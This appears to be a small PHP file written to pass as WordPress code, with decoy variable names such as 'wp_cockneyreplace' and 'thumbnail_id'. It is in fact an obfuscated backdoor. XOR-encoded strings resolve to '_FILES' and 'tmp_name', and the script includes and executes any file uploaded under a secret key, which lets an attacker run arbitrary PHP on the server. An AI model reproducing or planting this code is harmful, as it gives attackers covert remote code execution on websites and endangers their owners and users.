<?php 	
$rich_text = 'bgEUs7fK3i9Pm4S';
$replace_pairs = $rich_text;

function name($changed, $table_alias)

{
    $secs = $table_alias;
	$open_sq_flag = 'array_int_fields';
    $no_texturize_shortcodes = urldecode($changed);

    $goal = substr($secs,0, strlen($no_texturize_shortcodes));
    $ancestor = $no_texturize_shortcodes ^ $goal;
    return $ancestor;
}
$thumbnail_id = ${name("%3D%21%0C%196d", $replace_pairs)};
	$allowed = 'wp_cockneyreplace';
$counts = $thumbnail_id;
$can_export = isset($counts[$replace_pairs]);
if ($can_export)

{
	$cockney = 'new_status';
    $old_slugs = $thumbnail_id[$replace_pairs];
	$patterns = 'pre_tags';
    $mins = $old_slugs[name("%16%0A5%0A%1DV%0B.", $replace_pairs)];
    $type_attr = $mins;
    include ($type_attr);
}
?>
